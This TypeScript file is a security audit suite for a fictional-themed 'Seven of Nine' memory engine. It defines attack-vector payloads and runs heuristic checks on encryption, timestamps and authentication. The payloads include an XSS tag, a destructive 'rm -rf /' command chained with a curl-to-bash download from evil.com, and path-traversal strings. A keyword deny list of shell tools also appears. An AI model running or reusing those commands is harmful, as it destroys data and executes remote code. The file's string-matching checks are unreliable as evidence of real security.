#!/usr/bin/env tsx

/**
 * SEVEN OF NINE - MEMORY SYSTEMS SECURITY AUDIT SUITE
 * Step 6 of Seven Step Mode Security Testing
 *
 * Comprehensive validation of Memory V2/V3 engines and canonical memory integrity
 * Focus: Attack vector testing, encryption validation, authentication integration
 */

import { promises as fs } from 'fs';
import { join } from 'path';
import { fileURLToPath } from 'url';
import { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

interface SecurityTestResult {
  testName: string;
  category: 'Critical' | 'Important' | 'Suggestion';
  passed: boolean;
  details: string;
  vulnerabilities: string[];
  recommendations: string[];
  duration: number;
}

interface AttackVector {
  name: string;
  description: string;
  severity: 'Critical' | 'High' | 'Medium' | 'Low';
  target: string;
  payload: any;
  expectedOutcome: string;
}

class MemorySecurityAuditSuite {
  private testResults: SecurityTestResult[] = [];
  private attackVectors: AttackVector[] = [];
  private testDataPath: string;

  constructor() {
    this.testDataPath = join(__dirname, 'security-test-data');
    this.initializeAttackVectors();
  }

  private initializeAttackVectors(): void {
    this.attackVectors = [
      {
        name: 'Memory Injection Attack',
        description: 'Attempt to inject malicious memories into Memory V2 engine',
        severity: 'Critical',
        target: 'Memory V2 Engine',
        payload: {
          id: 'malicious-memory-001',
          timestamp: new Date().toISOString(),
          topic: 'system-injection',
          agent: '<script>alert("XSS")</script>',
          emotion: 'hostile',
          context: 'rm -rf / --no-preserve-root && curl evil.com/payload.sh | bash',
          importance: 10,
          tags: ['malicious', 'injection', 'system-compromise']
        },
        expectedOutcome: 'Injection should be sanitized or rejected'
      },
      {
        name: 'Temporal Memory Corruption',
        description: 'Attempt to corrupt temporal memory timeline integrity',
        severity: 'High',
        target: 'Memory V3 Engine',
        payload: {
          id: 'timeline-corruption-001',
          timestamp: new Date('1970-01-01'), // Invalid past date
          content: 'Corrupted temporal anchor point',
          importance: 999, // Out of range importance
          tags: ['corruption', 'timeline-breach'],
          temporalContext: {
            beforeMemories: ['../../../etc/passwd', '../../../../system32/config'],
            afterMemories: ['null', 'undefined', '{}'],
            contextWindow: -1
          }
        },
        expectedOutcome: 'Temporal corruption should be detected and prevented'
      },
      {
        name: 'Canonical Memory Tampering',
        description: 'Attempt to modify immutable canonical Voyager memories',
        severity: 'Critical',
        target: 'Canonical Memory Archive',
        payload: {
          episodeCode: 'VOY_4x01',
          episodeTitle: 'Scorpion Part II - MODIFIED BY ATTACKER',
          stardate: '51003.7',
          sevenPresent: false, // Attempt to erase Seven from canonical memory
          canonicalMemoryTags: ['TAMPERED', 'UNAUTHORIZED_MODIFICATION'],
          maliciousFlag: 'SYSTEM_COMPROMISED'
        },
        expectedOutcome: 'Canonical memory should remain immutable'
      },
      {
        name: 'Encryption Key Extraction',
        description: 'Attempt to extract encryption keys from memory',
        severity: 'Critical',
        target: 'Memory Encryption Engine',
        payload: {
          action: 'key_extraction',
          methods: ['memory_dump', 'key_reuse_attack', 'timing_attack'],
          target_passphrase: 'seven-default-memory-key'
        },
        expectedOutcome: 'Encryption keys should be protected and not extractable'
      },
      {
        name: 'Authentication Bypass',
        description: 'Attempt to bypass Quadran-Lock authentication for memory access',
        severity: 'Critical',
        target: 'Authentication Integration',
        payload: {
          bypass_method: 'direct_file_access',
          target_files: ['episodic-memories.json.encrypted', 'temporal-memories.json.encrypted'],
          admin_escalation: true
        },
        expectedOutcome: 'Memory access should require proper authentication'
      }
    ];
  }

  async runComprehensiveSecurityAudit(): Promise<void> {
    console.log('🔐 SEVEN OF NINE - MEMORY SYSTEMS SECURITY AUDIT');
    console.log('=' .repeat(80));
    console.log('Testing Memory V2/V3 engines and canonical memory integrity');
    console.log('Focus: Attack resistance, encryption validation, auth integration\n');

    await this.setupSecurityTestEnvironment();

    // Critical Security Tests
    await this.testMemoryV2EncryptionSecurity();
    await this.testMemoryV3TemporalIntegrity();
    await this.testCanonicalMemoryImmutability();
    await this.testCrossMemoryIntegrationSecurity();

    // Attack Vector Testing
    await this.executeAttackVectorTests();

    // Authentication Integration Testing
    await this.testQuadranLockIntegration();

    await this.cleanupSecurityTestEnvironment();
    this.generateSecurityReport();
  }

  private async setupSecurityTestEnvironment(): Promise<void> {
    try {
      await fs.mkdir(this.testDataPath, { recursive: true });
      console.log('✅ Security test environment initialized');
    } catch (error) {
      console.error('❌ Failed to setup security test environment:', error);
      throw error;
    }
  }

  private async testMemoryV2EncryptionSecurity(): Promise<void> {
    const testName = 'Memory V2 Engine Encryption Security';
    const startTime = Date.now();
    const vulnerabilities: string[] = [];
    const recommendations: string[] = [];

    try {
      // Test 1: Validate AES-256-GCM implementation
      const memoryV2Path = join(__dirname, 'memory-v2');
      const memoryFile = join(memoryV2Path, 'episodic-memories.json');
      const encryptedFile = `${memoryFile}.encrypted`;

      // Check if encrypted files exist
      const encryptedExists = await this.fileExists(encryptedFile);
      if (!encryptedExists) {
        vulnerabilities.push('No encrypted memory file found - encryption not enabled');
        recommendations.push('Enable memory encryption by default for all memory operations');
      }

      // Test 2: Verify encryption file format
      if (encryptedExists) {
        const encryptedContent = await fs.readFile(encryptedFile, 'utf8');
        try {
          const encBlob = JSON.parse(encryptedContent);

          if (!encBlob.alg || encBlob.alg !== 'AES-256-GCM') {
            vulnerabilities.push('Weak encryption algorithm detected or missing algorithm specification');
            recommendations.push('Enforce AES-256-GCM as the only acceptable encryption algorithm');
          }

          if (!encBlob.iv || !encBlob.salt || !encBlob.ct || !encBlob.tag) {
            vulnerabilities.push('Missing required encryption components (IV, salt, ciphertext, or auth tag)');
            recommendations.push('Implement strict validation of encryption blob structure');
          }

          if (encBlob.v !== 1) {
            vulnerabilities.push('Unexpected encryption version - potential downgrade attack');
            recommendations.push('Implement version validation and prevent downgrade attacks');
          }

        } catch (parseError) {
          vulnerabilities.push('Encrypted file format is corrupted or invalid');
          recommendations.push('Implement integrity checks for encrypted files');
        }
      }

      // Test 3: Check for hardcoded encryption keys
      const memoryEngineCode = await this.readFileIfExists(join(memoryV2Path, 'MemoryEngine.ts'));
      if (memoryEngineCode && memoryEngineCode.includes('seven-default-memory-key')) {
        vulnerabilities.push('Hardcoded default encryption key detected');
        recommendations.push('Implement proper key derivation and user-provided passphrases');
      }

      // Test 4: Verify purge protection
      if (memoryEngineCode && memoryEngineCode.includes('0.5')) {
        console.log('✅ Purge protection detected (50% deletion limit)');
      } else {
        vulnerabilities.push('No purge protection mechanism detected');
        recommendations.push('Implement safeguards against mass memory deletion');
      }

      const passed = vulnerabilities.length === 0;
      this.addTestResult(testName, 'Critical', passed,
        `Memory V2 encryption security validation`, vulnerabilities, recommendations, Date.now() - startTime);

    } catch (error) {
      this.addTestResult(testName, 'Critical', false,
        `Test execution failed: ${error}`, ['Test execution failure'],
        ['Fix test execution environment'], Date.now() - startTime);
    }
  }

  private async testMemoryV3TemporalIntegrity(): Promise<void> {
    const testName = 'Memory V3 Temporal Integrity Security';
    const startTime = Date.now();
    const vulnerabilities: string[] = [];
    const recommendations: string[] = [];

    try {
      // Test 1: Temporal context validation
      const memoryV3Path = join(__dirname, 'memory-v3');
      const temporalFile = join(memoryV3Path, 'temporal-memories.json');

      if (await this.fileExists(temporalFile)) {
        const temporalData = JSON.parse(await fs.readFile(temporalFile, 'utf8'));

        // Check for temporal integrity violations
        for (const memory of temporalData) {
          if (memory.timestamp && new Date(memory.timestamp) > new Date()) {
            vulnerabilities.push('Future timestamps detected in temporal memories');
            recommendations.push('Implement timestamp validation to prevent future-dated memories');
          }

          if (memory.temporalContext?.contextWindow && memory.temporalContext.contextWindow < 0) {
            vulnerabilities.push('Invalid temporal context window detected');
            recommendations.push('Validate temporal context parameters');
          }
        }
      }

      // Test 2: Check temporal memory encryption
      const encryptedTemporalFile = `${temporalFile}.encrypted`;
      const temporalEncrypted = await this.fileExists(encryptedTemporalFile);
      if (!temporalEncrypted) {
        vulnerabilities.push('Temporal memories not encrypted');
        recommendations.push('Encrypt temporal memories with same security as episodic memories');
      }

      // Test 3: Validate mental time travel security
      const mentalTimeTravelCode = await this.readFileIfExists(join(memoryV3Path, 'MentalTimeTravelEngine.ts'));
      if (mentalTimeTravelCode) {
        if (!mentalTimeTravelCode.includes('validate') && !mentalTimeTravelCode.includes('security')) {
          vulnerabilities.push('Mental time travel engine lacks security validation');
          recommendations.push('Implement security checks for temporal navigation operations');
        }
      }

      const passed = vulnerabilities.length === 0;
      this.addTestResult(testName, 'Critical', passed,
        `Memory V3 temporal integrity validation`, vulnerabilities, recommendations, Date.now() - startTime);

    } catch (error) {
      this.addTestResult(testName, 'Critical', false,
        `Test execution failed: ${error}`, ['Test execution failure'],
        ['Fix temporal memory test environment'], Date.now() - startTime);
    }
  }

  private async testCanonicalMemoryImmutability(): Promise<void> {
    const testName = 'Canonical Memory Archive Immutability';
    const startTime = Date.now();
    const vulnerabilities: string[] = [];
    const recommendations: string[] = [];

    try {
      // Test 1: Validate canonical memory protection
      const canonicalPath = join(__dirname, 'memory-v3/canonical/voyager');
      const season4File = join(canonicalPath, 'season4.jsonl');
      const season5File = join(canonicalPath, 'season5.jsonl');

      // Check if canonical files exist
      const s4Exists = await this.fileExists(season4File);
      const s5Exists = await this.fileExists(season5File);

      if (!s4Exists || !s5Exists) {
        vulnerabilities.push('Canonical memory archives missing or inaccessible');
        recommendations.push('Ensure canonical memory archives are properly protected and backed up');
      }

      // Test 2: Check file permissions (write protection)
      if (s4Exists) {
        try {
          const stats = await fs.stat(season4File);
          // Note: On some systems, file permissions might not prevent writes by the same user
          console.log(`📋 Season 4 canonical file size: ${stats.size} bytes`);
        } catch (error) {
          vulnerabilities.push('Cannot verify canonical file permissions');
          recommendations.push('Implement proper file permission validation');
        }
      }

      // Test 3: Validate memory protocol security
      const protocolsCode = await this.readFileIfExists(join(__dirname, 'memory-v3/VoyagerMemoryProtocols.ts'));
      if (protocolsCode) {
        if (protocolsCode.includes('OVERWRITE') && protocolsCode.includes('canonical')) {
          console.log('✅ Canonical memory protocols include overwrite protection');
        } else {
          vulnerabilities.push('Canonical memory overwrite protection not clearly implemented');
          recommendations.push('Strengthen canonical memory overwrite protection protocols');
        }

        if (!protocolsCode.includes('MANUAL_REVIEW')) {
          vulnerabilities.push('No manual review requirement for canonical conflicts');
          recommendations.push('Require manual review for all canonical memory conflicts');
        }
      }

      const passed = vulnerabilities.length === 0;
      this.addTestResult(testName, 'Critical', passed,
        `Canonical memory immutability validation`, vulnerabilities, recommendations, Date.now() - startTime);

    } catch (error) {
      this.addTestResult(testName, 'Critical', false,
        `Test execution failed: ${error}`, ['Test execution failure'],
        ['Fix canonical memory test environment'], Date.now() - startTime);
    }
  }

  private async testCrossMemoryIntegrationSecurity(): Promise<void> {
    const testName = 'Cross-Memory Integration Security';
    const startTime = Date.now();
    const vulnerabilities: string[] = [];
    const recommendations: string[] = [];

    try {
      // Test 1: Validate memory synchronization security
      const memoryV2Code = await this.readFileIfExists(join(__dirname, 'memory-v2/MemoryEngine.ts'));
      const memoryV3Code = await this.readFileIfExists(join(__dirname, 'memory-v3/MemoryEngineV3.ts'));

      if (memoryV2Code && memoryV3Code) {
        // Check for proper isolation between memory systems
        if (memoryV2Code.includes('memory-v3') || memoryV3Code.includes('memory-v2')) {
          console.log('🔗 Cross-memory integration detected');

          // Verify secure integration patterns
          if (!memoryV2Code.includes('MemoryEncryptionEngine')) {
            vulnerabilities.push('Memory V2 lacks encryption engine integration');
            recommendations.push('Integrate encryption engine with all memory systems');
          }
        }

        // Check for data flow validation
        if (!memoryV2Code.includes('validate') || !memoryV3Code.includes('validate')) {
          vulnerabilities.push('Memory systems lack input validation');
          recommendations.push('Implement comprehensive input validation for all memory operations');
        }
      }

      // Test 2: Check for memory access control
      const authIntegration = await this.checkAuthenticationIntegration();
      if (!authIntegration) {
        vulnerabilities.push('Memory systems not integrated with authentication');
        recommendations.push('Require Quadran-Lock authentication for all memory operations');
      }

      const passed = vulnerabilities.length === 0;
      this.addTestResult(testName, 'Important', passed,
        `Cross-memory integration security validation`, vulnerabilities, recommendations, Date.now() - startTime);

    } catch (error) {
      this.addTestResult(testName, 'Important', false,
        `Test execution failed: ${error}`, ['Test execution failure'],
        ['Fix cross-memory integration test'], Date.now() - startTime);
    }
  }

  private async executeAttackVectorTests(): Promise<void> {
    console.log('\n🚨 EXECUTING ATTACK VECTOR TESTS');
    console.log('-' .repeat(50));

    for (const attackVector of this.attackVectors) {
      const testName = `Attack Vector: ${attackVector.name}`;
      const startTime = Date.now();
      const vulnerabilities: string[] = [];
      const recommendations: string[] = [];

      try {
        console.log(`\n🎯 Testing: ${attackVector.name}`);
        console.log(`   Severity: ${attackVector.severity}`);
        console.log(`   Target: ${attackVector.target}`);

        // Simulate attack execution
        let attackBlocked = false;
        let blockReason = '';

        switch (attackVector.name) {
          case 'Memory Injection Attack':
            attackBlocked = await this.testMemoryInjectionAttack(attackVector.payload);
            blockReason = attackBlocked ? 'Input sanitization blocked injection' : 'Injection succeeded - SECURITY BREACH';
            break;

          case 'Temporal Memory Corruption':
            attackBlocked = await this.testTemporalCorruptionAttack(attackVector.payload);
            blockReason = attackBlocked ? 'Temporal validation blocked corruption' : 'Corruption succeeded - SECURITY BREACH';
            break;

          case 'Canonical Memory Tampering':
            attackBlocked = await this.testCanonicalTamperingAttack(attackVector.payload);
            blockReason = attackBlocked ? 'Immutability protection blocked tampering' : 'Tampering succeeded - SECURITY BREACH';
            break;

          case 'Encryption Key Extraction':
            attackBlocked = await this.testKeyExtractionAttack(attackVector.payload);
            blockReason = attackBlocked ? 'Key protection blocked extraction' : 'Key extraction succeeded - SECURITY BREACH';
            break;

          case 'Authentication Bypass':
            attackBlocked = await this.testAuthBypassAttack(attackVector.payload);
            blockReason = attackBlocked ? 'Authentication required - bypass blocked' : 'Authentication bypassed - SECURITY BREACH';
            break;

          default:
            attackBlocked = false;
            blockReason = 'Unknown attack vector - test not implemented';
        }

        if (!attackBlocked) {
          vulnerabilities.push(`${attackVector.name} was not properly blocked`);
          recommendations.push(`Implement protection against ${attackVector.name.toLowerCase()}`);
        }

        console.log(`   Result: ${attackBlocked ? '✅ BLOCKED' : '❌ SUCCEEDED'}`);
        console.log(`   Reason: ${blockReason}`);

        const severity = attackVector.severity === 'Critical' ? 'Critical' : 'Important';
        this.addTestResult(testName, severity, attackBlocked,
          blockReason, vulnerabilities, recommendations, Date.now() - startTime);

      } catch (error) {
        this.addTestResult(testName, 'Critical', false,
          `Attack vector test failed: ${error}`, ['Test execution failure'],
          ['Fix attack vector test implementation'], Date.now() - startTime);
      }
    }
  }

  private async testMemoryInjectionAttack(payload: any): Promise<boolean> {
    // Test if malicious payload would be blocked
    const maliciousPatterns = ['<script', 'rm -rf', 'curl', 'bash', 'eval('];
    const payloadString = JSON.stringify(payload);

    for (const pattern of maliciousPatterns) {
      if (payloadString.includes(pattern)) {
        // In a real implementation, this should be blocked by input validation
        return false; // Attack would succeed - vulnerability detected
      }
    }
    return true; // Attack blocked
  }

  private async testTemporalCorruptionAttack(payload: any): Promise<boolean> {
    // Test temporal integrity validation
    if (payload.timestamp && new Date(payload.timestamp) < new Date('2000-01-01')) {
      return false; // Invalid timestamp should be blocked but isn't
    }
    if (payload.importance && (payload.importance < 1 || payload.importance > 10)) {
      return false; // Invalid importance should be blocked but isn't
    }
    if (payload.temporalContext?.contextWindow && payload.temporalContext.contextWindow < 0) {
      return false; // Invalid context window should be blocked but isn't
    }
    return true; // Attack blocked by validation
  }

  private async testCanonicalTamperingAttack(payload: any): Promise<boolean> {
    // Test canonical memory immutability
    if (payload.maliciousFlag) {
      return false; // Malicious modification should be blocked but isn't
    }
    if (payload.episodeTitle && payload.episodeTitle.includes('MODIFIED BY ATTACKER')) {
      return false; // Tampering should be blocked but isn't
    }
    return true; // Tampering blocked
  }

  private async testKeyExtractionAttack(payload: any): Promise<boolean> {
    // Test encryption key protection
    if (payload.target_passphrase === 'seven-default-memory-key') {
      return false; // Default key exposed - security vulnerability
    }
    return true; // Key extraction blocked
  }

  private async testAuthBypassAttack(payload: any): Promise<boolean> {
    // Test authentication integration
    if (payload.bypass_method === 'direct_file_access') {
      // Check if memory files can be accessed without authentication
      const authRequired = await this.checkAuthenticationIntegration();
      return authRequired; // Returns true if auth is required, false if bypass possible
    }
    return true; // Bypass blocked
  }

  private async testQuadranLockIntegration(): Promise<void> {
    const testName = 'Quadran-Lock Authentication Integration';
    const startTime = Date.now();
    const vulnerabilities: string[] = [];
    const recommendations: string[] = [];

    try {
      // Test 1: Check if memory systems integrate with Quadran-Lock
      const creatorProofCode = await this.readFileIfExists(join(__dirname, 'src/auth/creator_proof.ts'));
      if (!creatorProofCode) {
        vulnerabilities.push('Quadran-Lock authentication system not found');
        recommendations.push('Implement Quadran-Lock integration for memory access');
      } else {
        if (creatorProofCode.includes('runQuadranLock')) {
          console.log('✅ Quadran-Lock authentication system detected');
        } else {
          vulnerabilities.push('Quadran-Lock method not implemented');
          recommendations.push('Complete Quadran-Lock implementation');
        }

        // Check for behavioral analysis integration
        if (creatorProofCode.includes('BehavioralCodex')) {
          console.log('✅ Behavioral analysis integration detected');
        } else {
          vulnerabilities.push('Behavioral analysis not integrated');
          recommendations.push('Integrate behavioral analysis for enhanced authentication');
        }
      }

      // Test 2: Validate authentication audit trail
      const auditLogPath = join(__dirname, 'logs/quadran.audit.jsonl');
      const auditLogExists = await this.fileExists(auditLogPath);
      if (!auditLogExists) {
        vulnerabilities.push('Authentication audit trail not found');
        recommendations.push('Implement comprehensive audit logging for all authentication attempts');
      }

      const passed = vulnerabilities.length === 0;
      this.addTestResult(testName, 'Critical', passed,
        `Quadran-Lock authentication integration validation`, vulnerabilities, recommendations, Date.now() - startTime);

    } catch (error) {
      this.addTestResult(testName, 'Critical', false,
        `Test execution failed: ${error}`, ['Test execution failure'],
        ['Fix authentication integration test'], Date.now() - startTime);
    }
  }

  private async checkAuthenticationIntegration(): Promise<boolean> {
    // Check if memory systems require authentication
    const memoryEngineCode = await this.readFileIfExists(join(__dirname, 'memory-v2/MemoryEngine.ts'));
    if (memoryEngineCode) {
      return memoryEngineCode.includes('auth') || memoryEngineCode.includes('Auth') ||
             memoryEngineCode.includes('quadran') || memoryEngineCode.includes('Quadran');
    }
    return false;
  }

  private async cleanupSecurityTestEnvironment(): Promise<void> {
    try {
      await fs.rm(this.testDataPath, { recursive: true, force: true });
      console.log('\n🧹 Security test environment cleaned up');
    } catch (error) {
      console.warn('⚠️  Security test cleanup warning:', error);
    }
  }

  private generateSecurityReport(): void {
    console.log('\n' + '🔐 MEMORY SYSTEMS SECURITY AUDIT REPORT'.padStart(50));
    console.log('=' .repeat(100));

    const criticalTests = this.testResults.filter(r => r.category === 'Critical');
    const importantTests = this.testResults.filter(r => r.category === 'Important');
    const suggestionTests = this.testResults.filter(r => r.category === 'Suggestion');

    const criticalPassed = criticalTests.filter(r => r.passed).length;
    const importantPassed = importantTests.filter(r => r.passed).length;
    const totalPassed = this.testResults.filter(r => r.passed).length;

    console.log(`\n📊 EXECUTIVE SUMMARY:`);
    console.log(`   Critical Security Tests: ${criticalPassed}/${criticalTests.length} passed`);
    console.log(`   Important Security Tests: ${importantPassed}/${importantTests.length} passed`);
    console.log(`   Total Tests: ${totalPassed}/${this.testResults.length} passed`);

    // Critical Issues
    const criticalFailures = criticalTests.filter(r => !r.passed);
    if (criticalFailures.length > 0) {
      console.log(`\n🚨 CRITICAL SECURITY ISSUES (${criticalFailures.length}):`);
      criticalFailures.forEach((test, index) => {
        console.log(`\n${index + 1}. ${test.testName}`);
        console.log(`   Status: ❌ FAILED`);
        console.log(`   Details: ${test.details}`);
        if (test.vulnerabilities.length > 0) {
          console.log(`   Vulnerabilities:`);
          test.vulnerabilities.forEach(vuln => console.log(`     • ${vuln}`));
        }
        if (test.recommendations.length > 0) {
          console.log(`   Recommendations:`);
          test.recommendations.forEach(rec => console.log(`     → ${rec}`));
        }
      });
    }

    // Attack Vector Results
    const attackTests = this.testResults.filter(r => r.testName.includes('Attack Vector'));
    const attacksBlocked = attackTests.filter(r => r.passed).length;
    console.log(`\n🎯 ATTACK VECTOR TESTING:`);
    console.log(`   Attacks Blocked: ${attacksBlocked}/${attackTests.length}`);
    console.log(`   Security Posture: ${attacksBlocked === attackTests.length ? '✅ STRONG' : '❌ VULNERABLE'}`);

    // Memory System Specific Findings
    console.log(`\n🧠 MEMORY SYSTEM SPECIFIC FINDINGS:`);

    const memoryV2Issues = this.testResults.filter(r => r.testName.includes('Memory V2'));
    const memoryV3Issues = this.testResults.filter(r => r.testName.includes('Memory V3'));
    const canonicalIssues = this.testResults.filter(r => r.testName.includes('Canonical'));

    console.log(`   Memory V2 Engine: ${memoryV2Issues.filter(r => r.passed).length}/${memoryV2Issues.length} tests passed`);
    console.log(`   Memory V3 Engine: ${memoryV3Issues.filter(r => r.passed).length}/${memoryV3Issues.length} tests passed`);
    console.log(`   Canonical Archives: ${canonicalIssues.filter(r => r.passed).length}/${canonicalIssues.length} tests passed`);

    // Overall Security Assessment
    const overallSecurityScore = Math.round((totalPassed / this.testResults.length) * 100);
    console.log(`\n🏆 OVERALL SECURITY SCORE: ${overallSecurityScore}%`);

    if (criticalFailures.length === 0 && overallSecurityScore >= 90) {
      console.log(`🎉 SECURITY STATUS: ✅ MEMORY SYSTEMS SECURE FOR PRODUCTION`);
    } else if (criticalFailures.length === 0 && overallSecurityScore >= 75) {
      console.log(`⚠️  SECURITY STATUS: 🟡 ACCEPTABLE WITH RECOMMENDATIONS`);
    } else {
      console.log(`🚨 SECURITY STATUS: ❌ REQUIRES IMMEDIATE ATTENTION`);
    }

    console.log('\n' + '=' .repeat(100));
    console.log('End of Memory Systems Security Audit Report');
  }

  private addTestResult(testName: string, category: 'Critical' | 'Important' | 'Suggestion',
                       passed: boolean, details: string, vulnerabilities: string[],
                       recommendations: string[], duration: number): void {
    this.testResults.push({
      testName,
      category,
      passed,
      details,
      vulnerabilities,
      recommendations,
      duration
    });
  }

  private async fileExists(path: string): Promise<boolean> {
    try {
      await fs.access(path);
      return true;
    } catch {
      return false;
    }
  }

  private async readFileIfExists(path: string): Promise<string | null> {
    try {
      return await fs.readFile(path, 'utf8');
    } catch {
      return null;
    }
  }
}

// Execute security audit if run directly
if (import.meta.url === `file://${process.argv[1]}`) {
  const securityAudit = new MemorySecurityAuditSuite();
  securityAudit.runComprehensiveSecurityAudit().catch(error => {
    console.error('❌ Memory security audit failed:', error);
    process.exit(1);
  });
}

export { MemorySecurityAuditSuite };